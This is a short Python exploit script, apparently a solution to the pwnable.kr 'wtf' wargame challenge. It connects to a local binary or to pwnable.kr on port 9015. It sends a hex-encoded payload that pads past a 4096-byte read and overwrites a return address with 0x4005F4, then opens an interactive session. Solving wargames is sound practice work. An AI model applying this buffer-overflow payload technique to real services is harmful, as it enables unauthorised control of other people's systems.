#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from sys import argv

conn = ("./wtf") if argv[1] == "l" else ("pwnable.kr", 9015)
io = zio(conn)

io.read_until('payload please : ')
io.writeline(('-1'.ljust(4096, '\n') + 'a' * 0x38 + l64(0x4005F4) + '\n').encode('hex'))

io.interact()
io.close()
'''
https://blog.csdn.net/K346K346/article/details/63259524
'''
